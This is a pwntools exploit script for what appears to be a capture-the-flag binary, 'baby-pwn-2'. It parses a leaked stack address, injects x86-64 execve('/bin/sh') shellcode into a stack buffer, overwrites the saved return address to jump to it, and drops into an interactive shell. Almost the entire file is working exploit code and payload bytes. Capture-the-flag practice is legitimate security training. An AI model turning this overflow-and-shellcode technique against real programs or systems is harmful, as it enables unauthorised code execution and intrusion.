from pwn import *

# Set up the target binary
binary = './baby-pwn-2'  # Path to the binary
elf = ELF(binary)

# Start the process (use remote for remote challenges)
if args.REMOTE:
    p = remote('localhost', 5000)
else:
    p = process(binary)

# Step 1: Leak the stack address
print(p.recvline().decode())  # "Welcome to the baby pwn 2 challenge!"
leak_line = p.recvline().decode()  # "Stack address leak: 0x..."
print(f"Leak line: {leak_line}")

# Parse leaked address
leaked_address = int(leak_line.split(":")[1].strip(), 16)
print(f"Leaked stack address: {hex(leaked_address)}")

# Step 2: Inject shellcode
'''
0:  48 31 d2                xor    rdx,rdx
3:  48 31 c0                xor    rax,rax
6:  48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f
d:  2f 73 68
10: 48 c1 eb 08             shr    rbx,0x8
14: 53                      push   rbx
15: 48 89 e7                mov    rdi,rsp
18: 50                      push   rax
19: 57                      push   rdi
1a: 48 89 e6                mov    rsi,rsp
1d: b0 3b                   mov    al,0x3b
1f: 0f 05                   syscall
'''
shellcode = b"\x48\x31\xD2\x48\x31\xC0\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05"
print(f"Shellcode length: {len(shellcode)} bytes")

# Step 3: Calculate offsets and target address
buffer_address = leaked_address  # Start of the buffer
print(f"Buffer address: {hex(buffer_address)}")
print(f"Shellcode target address: {hex(buffer_address)}")

# Step 4: Build payload
# Overwrite buffer + saved RBP + saved return address
payload = shellcode.ljust(64, asm('nop'))  # Inject shellcode at the start
payload += asm('nop') * 8  # Saved RBP padding
# Overwrite return address to point to the buffer
payload += p64(buffer_address)

print(f"Payload length: {len(payload)} bytes")
print(f"Payload: {payload}")

# Step 5: Send payload
print("Sending payload...")
p.sendline(payload)

# Step 6: Interact with the shell
p.interactive()
